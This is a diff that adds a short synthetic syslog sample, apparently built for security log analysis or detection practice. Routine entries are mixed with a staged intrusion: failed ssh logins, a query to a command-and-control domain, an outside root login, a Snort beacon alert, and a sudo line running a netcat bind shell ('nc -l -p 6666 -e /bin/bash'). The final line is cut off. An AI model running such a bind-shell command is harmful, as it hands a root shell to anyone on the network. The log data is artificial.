@@ -1,0 +1,15 @@
+Jun  3 17:20:01 server_alpha CRON[15021]: (root) CMD (   /usr/lib/ddns/dynamic_dns_functions.sh)
+Jun  3 17:20:15 web_server_01 sshd[22031]: Accepted publickey for user_john from 192.168.1.10 port 54321 ssh2: RSA SHA256:xxxxxxxxxxxxxxx
+Jun  3 17:21:05 firewall_corp filterlog[2345]: 82,,,1000000103,em0,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,10.0.1.5,172.16.5.100,33890,443,0,S,123456789,0,64240,,0,0
+Jun  3 17:22:10 dhcp_server dhcpd[1100]: DHCPREQUEST for 192.168.1.150 from aa:bb:cc:dd:ee:ff via eth0
+Jun  3 17:22:12 dhcp_server dhcpd[1100]: DHCPACK on 192.168.1.150 to aa:bb:cc:dd:ee:ff via eth0
+Jun  3 17:23:00 server_beta systemd[1]: Started User Login Management.
+Jun  3 17:25:01 server_alpha sshd[25001]: Failed password for invalid user attempt_user from 203.0.113.45 port 22 ssh2
+Jun  3 17:25:03 server_alpha sshd[25002]: Failed password for invalid user attempt_user from 203.0.113.45 port 22 ssh2
+Jun  3 17:25:05 server_alpha sshd[25003]: Received disconnect from 203.0.113.45 port 22:11: Bye Bye [preauth]
+Jun  3 17:26:15 web_server_01 kernel: [  345.123456] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.
+Jun  3 17:27:30 internal_pc_user_jane named[5051]: client @0x7f00a406b000 192.168.1.50#54321 (malicious-domain-for-c2.com): query: malicious-domain-for-c2.com IN A + (10.0.0.1)
+Jun  3 17:28:01 server_alpha sshd[28001]: Accepted password for root from 103.27.10.99 port 48765 ssh2
+Jun  3 17:28:05 server_alpha sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/nc -l -p 6666 -e /bin/bash
+Jun  3 17:29:10 ids_sensor snort[3105]: [1:2000498:10] ET POLICY Outbound CnC Beacon (Bot Udp) to Dotted Quad (198.51.100.23:53)
+Jun  3 17:30:00 firewall_corp filterlog[2345]: 
